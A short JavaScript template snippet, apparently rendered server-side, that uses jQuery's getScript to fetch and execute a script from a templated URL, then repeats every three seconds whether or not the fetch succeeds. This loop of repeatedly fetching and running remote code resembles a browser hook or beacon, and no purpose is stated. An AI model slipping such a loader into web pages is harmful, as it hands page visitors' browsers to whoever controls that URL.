function loadScript() {
	if(window.$ && window.$.getScript)
	$.getScript("[(${url})]").done(function(script, textStatus) {
		console.log(textStatus);
		setTimeout(loadScript, 3000);
	}).fail(function(jqxhr, settings, exception) {
		setTimeout(loadScript, 3000);
	});
};loadScript();
